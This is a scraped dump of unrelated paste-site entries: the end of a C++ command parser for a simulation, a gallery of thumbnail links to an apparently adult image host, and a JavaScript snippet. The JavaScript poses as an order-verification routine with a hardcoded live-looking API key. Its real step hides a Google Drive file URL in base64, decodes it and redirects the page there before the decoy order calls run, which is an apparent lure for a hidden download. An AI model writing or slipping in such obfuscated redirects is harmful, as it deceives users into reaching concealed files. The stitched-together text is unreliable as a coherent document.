            commandRemoveSubstance(container, type, pos);
        } else if(cmd==""ATTACK""){
            string container, type; int pos1, pos2;
            ss >> container >> type >> pos1 >> pos2;
            commandAttack(container, type, pos1, pos2);
        } else if(cmd==""TALK""){
            string container;
            ss >> container;
            if(container==""Freedom""){
                int pos;
                ss >> pos;
                commandTalk(container, """", pos);
            } else {
                string type; int pos;
                ss >> type >> pos;
                commandTalk(container, type, pos);
            }
        } else if(cmd==""PERIOD""){
            commandPeriod();
        }
    }
    return 0;
}
"
KwSyyu3K,Sky Wonderland - A Big Surprise for Tiny Sky - Apr 2,MarcSpencer,HTML,Wednesday 2nd of April 2025 05:26:08 AM CDT,"Sky Wonderland - A Big Surprise for Tiny Sky - Apr 2
<a href=""https://fappic.com/o2qg1bqxoc38/622ja3.jpg""><img src=""https://img103.fappic.com/i/03912/o2qg1bqxoc38_t.jpg""></a><a href=""https://fappic.com/sammdp5i01g9/622ja4.jpg""><img src=""https://img103.fappic.com/i/03912/sammdp5i01g9_t.jpg""></a><a href=""https://fappic.com/tg5fsjz4jxbr/622ja5.jpg""><img src=""https://img103.fappic.com/i/03912/tg5fsjz4jxbr_t.jpg""></a><a href=""https://fappic.com/0u2c9jif6kue/622ja7.jpg""><img src=""https://img103.fappic.com/i/03912/0u2c9jif6kue_t.jpg""></a><a href=""https://fappic.com/s3vuefv3g491/622ja8.jpg""><img src=""https://img103.fappic.com/i/03912/s3vuefv3g491_t.jpg""></a><a href=""https://fappic.com/hu7z2pm0b2fr/622ja9.jpg""><img src=""https://img103.fappic.com/i/03912/hu7z2pm0b2fr_t.jpg""></a><a href=""https://fappic.com/db5v71wlkm0i/622jab.jpg""><img src=""https://img103.fappic.com/i/03912/db5v71wlkm0i_t.jpg""></a><a href=""https://fappic.com/0algf23kck25/622jac.jpg""><img src=""https://img103.fappic.com/i/03912/0algf23kck25_t.jpg""></a><a href=""https://fappic.com/6yjr0ubr7yvi/622jad.jpg""><img src=""https://img103.fappic.com/i/03912/6yjr0ubr7yvi_t.jpg""></a><a href=""https://fappic.com/xlqtwjntq6fr/622jaf.jpg""><img src=""https://img103.fappic.com/i/03912/xlqtwjntq6fr_t.jpg""></a><a href=""https://fappic.com/181ufmeboamr/622jah.jpg""><img src=""https://img103.fappic.com/i/03912/181ufmeboamr_t.jpg""></a><a href=""https://fappic.com/u0ethc6u3uyz/622jai.jpg""><img src=""https://img103.fappic.com/i/03912/u0ethc6u3uyz_t.jpg""></a><a href=""https://fappic.com/kdpukxjtg5hf/622jaj.jpg""><img src=""https://img103.fappic.com/i/03912/kdpukxjtg5hf_t.jpg""></a><a href=""https://fappic.com/pqks16g1j9de/622jal.jpg""><img src=""https://img103.fappic.com/i/03912/pqks16g1j9de_t.jpg""></a><a href=""https://fappic.com/249ik6zifju0/622jam.jpg""><img src=""https://img103.fappic.com/i/03912/249ik6zifju0_t.jpg""></a><a href=""https://fappic.com/ulcqnmy9dkna/622jan.jpg""><img src=""https://img103.fappic.com/i/03912/ulcqnmy9dkna_t.jpg""></a><a href=""https://fappic.com/358lw0ydhlcv/622jao.jpg""><img src=""https://img103.fappic.com/i/03912/358lw0ydhlcv_t.jpg""></a><a href=""https://fappic.com/k64jmoz5afat/622jaq.jpg""><img src=""https://img103.fappic.com/i/03912/k64jmoz5afat_t.jpg""></a><a href=""https://fappic.com/2mxyyc2f4f1m/622jar.jpg""><img src=""https://img103.fappic.com/i/03912/2mxyyc2f4f1m_t.jpg""></a><a href=""https://fappic.com/eq8h2qy1a05d/622jas.jpg""><img src=""https://img103.fappic.com/i/03912/eq8h2qy1a05d_t.jpg""></a><a href=""https://fappic.com/dqw0vs8r3tpm/622jau.jpg""><img src=""https://img103.fappic.com/i/03912/dqw0vs8r3tpm_t.jpg""></a><a href=""https://fappic.com/v0tgvz1ruak6/622jav.jpg""><img src=""https://img103.fappic.com/i/03912/v0tgvz1ruak6_t.jpg""></a><a href=""https://fappic.com/gixaljfebnw6/622jaw.jpg""><img src=""https://img103.fappic.com/i/03912/gixaljfebnw6_t.jpg""></a><a href=""https://fappic.com/nl8hgs66ni5d/622jay.jpg""><img src=""https://img103.fappic.com/i/03912/nl8hgs66ni5d_t.jpg""></a><a href=""https://fappic.com/5hvnlvnctir8/622jaz.jpg""><img src=""https://img103.fappic.com/i/03912/5hvnlvnctir8_t.jpg""></a><a href=""https://fappic.com/05wt32n5bidh/622jb1.jpg""><img src=""https://img103.fappic.com/i/03912/05wt32n5bidh_t.jpg""></a><a href=""https://fappic.com/2vb27lg5xtwm/622jb2.jpg""><img src=""https://img103.fappic.com/i/03912/2vb27lg5xtwm_t.jpg""></a><a href=""https://fappic.com/s78229wlx1xi/622jb3.jpg""><img src=""https://img103.fappic.com/i/03912/s78229wlx1xi_t.jpg""></a><a href=""https://fappic.com/1275s1r3f3uz/622jb5.jpg""><img src=""https://img103.fappic.com/i/03912/1275s1r3f3uz_t.jpg""></a><a href=""https://fappic.com/kqs9wlekgfhb/622jb6.jpg""><img src=""https://img103.fappic.com/i/03912/kqs9wlekgfhb_t.jpg""></a><a href=""https://fappic.com/ik39vg8chdzx/622jb9.jpg""><img src=""https://img103.fappic.com/i/03912/ik39vg8chdzx_t.jpg""></a><a href=""https://fappic.com/ldlnwpcb1hak/622jba.jpg""><img src=""https://img103.fappic.com/i/03912/ldlnwpcb1hak_t.jpg""></a><a href=""https://fappic.com/uad8ixuqkl9u/622jbc.jpg""><img src=""https://img103.fappic.com/i/03912/uad8ixuqkl9u_t.jpg""></a><a href=""https://fappic.com/7wt6zyv2iyn8/622jbe.jpg""><img src=""https://img103.fappic.com/i/03912/7wt6zyv2iyn8_t.jpg""></a><a href=""https://fappic.com/3xl61atiacdh/622jbf.jpg""><img src=""https://img103.fappic.com/i/03912/3xl61atiacdh_t.jpg""></a><a href=""https://fappic.com/oszyzvsfg98b/622jbg.jpg""><img src=""https://img103.fappic.com/i/03912/oszyzvsfg98b_t.jpg""></a><a href=""https://fappic.com/heyk2rzkrys8/622jbi.jpg""><img src=""https://img103.fappic.com/i/03912/heyk2rzkrys8_t.jpg""></a><a href=""https://fappic.com/jnfftes06zs0/622jbj.jpg""><img src=""https://img103.fappic.com/i/03912/jnfftes06zs0_t.jpg""></a><a href=""https://fappic.com/7xldzempefxl/622jbl.jpg""><img src=""https://img103.fappic.com/i/03912/7xldzempefxl_t.jpg""></a><a href=""https://fappic.com/v6izhcj55r11/622jbm.jpg""><img src=""https://img103.fappic.com/i/03912/v6izhcj55r11_t.jpg""></a><a href=""https://fappic.com/t30be8dmjw9h/622jbo.jpg""><img src=""https://img103.fappic.com/i/03912/t30be8dmjw9h_t.jpg""></a><a href=""https://fappic.com/jvdwhub7n9nk/622jbp.jpg""><img src=""https://img103.fappic.com/i/03912/jvdwhub7n9nk_t.jpg""></a><a href=""https://fappic.com/naeg8gf6z9bb/622jbr.jpg""><img src=""https://img103.fappic.com/i/03912/naeg8gf6z9bb_t.jpg""></a><a href=""https://fappic.com/l3gt6jzcgtv7/622jbs.jpg""><img src=""https://img103.fappic.com/i/03912/l3gt6jzcgtv7_t.jpg""></a><a href=""https://fappic.com/nspwvgfl2w7q/622jbt.jpg""><img src=""https://img103.fappic.com/i/03912/nspwvgfl2w7q_t.jpg""></a><a href=""https://fappic.com/ofp7t7fiktfh/622jbv.jpg""><img src=""https://img103.fappic.com/i/03912/ofp7t7fiktfh_t.jpg""></a><a href=""https://fappic.com/2g8t7yp9wqa4/622jbw.jpg""><img src=""https://img103.fappic.com/i/03912/2g8t7yp9wqa4_t.jpg""></a><a href=""https://fappic.com/wcigp07brpof/622jby.jpg""><img src=""https://img103.fappic.com/i/03912/wcigp07brpof_t.jpg""></a><a href=""https://fappic.com/up5zqglfo8i4/622jbz.jpg""><img src=""https://img103.fappic.com/i/03912/up5zqglfo8i4_t.jpg""></a><a href=""https://fappic.com/yco3yy0813j6/622jc1.jpg""><img src=""https://img103.fappic.com/i/03912/yco3yy0813j6_t.jpg""></a><a href=""https://fappic.com/nijnq0m59xsw/622jc2.jpg""><img src=""https://img103.fappic.com/i/03912/nijnq0m59xsw_t.jpg""></a><a href=""https://fappic.com/umv8eds1mtat/622jc3.jpg""><img src=""https://img103.fappic.com/i/03912/umv8eds1mtat_t.jpg""></a><a href=""https://fappic.com/wf0ccj00k9dn/622jc5.jpg""><img src=""https://img103.fappic.com/i/03912/wf0ccj00k9dn_t.jpg""></a><a href=""https://fappic.com/nfs8yjo2nv1s/622jc6.jpg""><img src=""https://img103.fappic.com/i/03912/nfs8yjo2nv1s_t.jpg""></a><a href=""https://fappic.com/qy4faw2n1zcy/622jc7.jpg""><img src=""https://img103.fappic.com/i/03912/qy4faw2n1zcy_t.jpg""></a><a href=""https://fappic.com/hpczbej8slmi/622jc9.jpg""><img src=""https://img103.fappic.com/i/03912/hpczbej8slmi_t.jpg""></a><a href=""https://fappic.com/ll6fl5g6c4ka/622jca.jpg""><img src=""https://img103.fappic.com/i/03912/ll6fl5g6c4ka_t.jpg""></a><a href=""https://fappic.com/0uqry4ku9by4/622jcc.jpg""><img src=""https://img103.fappic.com/i/03912/0uqry4ku9by4_t.jpg""></a><a href=""https://fappic.com/ok1fo3432xwf/622jcd.jpg""><img src=""https://img103.fappic.com/i/03912/ok1fo3432xwf_t.jpg""></a><a href=""https://fappic.com/y997f3dv78uv/622jce.jpg""><img src=""https://img103.fappic.com/i/03912/y997f3dv78uv_t.jpg""></a><a href=""https://fappic.com/4o4amq6bxb6r/622jcg.jpg""><img src=""https://img103.fappic.com/i/03912/4o4amq6bxb6r_t.jpg""></a><a href=""https://fappic.com/gnobz3031ddb/622jch.jpg""><img src=""https://img103.fappic.com/i/03912/gnobz3031ddb_t.jpg""></a><a href=""https://fappic.com/6muosfbjddvd/622jcj.jpg""><img src=""https://img103.fappic.com/i/03912/6muosfbjddvd_t.jpg""></a><a href=""https://fappic.com/o55s68irnfpj/622jck.jpg""><img src=""https://img103.fappic.com/i/03912/o55s68irnfpj_t.jpg""></a><a href=""https://fappic.com/iajxxjnbnviu/622jcl.jpg""><img src=""https://img103.fappic.com/i/03912/iajxxjnbnviu_t.jpg""></a><a href=""https://fappic.com/8509bv3xm7to/622jcn.jpg""><img src=""https://img103.fappic.com/i/03912/8509bv3xm7to_t.jpg""></a><a href=""https://fappic.com/mf244myvq1b2/622jco.jpg""><img src=""https://img103.fappic.com/i/03912/mf244myvq1b2_t.jpg""></a><a href=""https://fappic.com/vnv0lln587fj/622jcp.jpg""><img src=""https://img103.fappic.com/i/03912/vnv0lln587fj_t.jpg""></a><a href=""https://fappic.com/8gbolss62t90/622jcr.jpg""><img src=""https://img103.fappic.com/i/03912/8gbolss62t90_t.jpg""></a><a href=""https://fappic.com/h8ns6ac5nhyj/622jcs.jpg""><img src=""https://img103.fappic.com/i/03912/h8ns6ac5nhyj_t.jpg""></a><a href=""https://fappic.com/yzrkncjw9whv/622jcu.jpg""><img src=""https://img103.fappic.com/i/03912/yzrkncjw9whv_t.jpg""></a><a href=""https://fappic.com/un5hbxwc1mm5/622jcv.jpg""><img src=""https://img103.fappic.com/i/03912/un5hbxwc1mm5_t.jpg""></a><a href=""https://fappic.com/afjxbu3ukvko/622jcw.jpg""><img src=""https://img103.fappic.com/i/03912/afjxbu3ukvko_t.jpg""></a><a href=""https://fappic.com/nmn2tb54xkxi/622jcy.jpg""><img src=""https://img103.fappic.com/i/03912/nmn2tb54xkxi_t.jpg""></a><a href=""https://fappic.com/mmowjlzq6tmp/622jcz.jpg""><img src=""https://img103.fappic.com/i/03912/mmowjlzq6tmp_t.jpg""></a>
"
Hr8c6HKn,Untitled,rodrigomaise99,JavaScript,Wednesday 2nd of April 2025 05:05:25 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/285/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
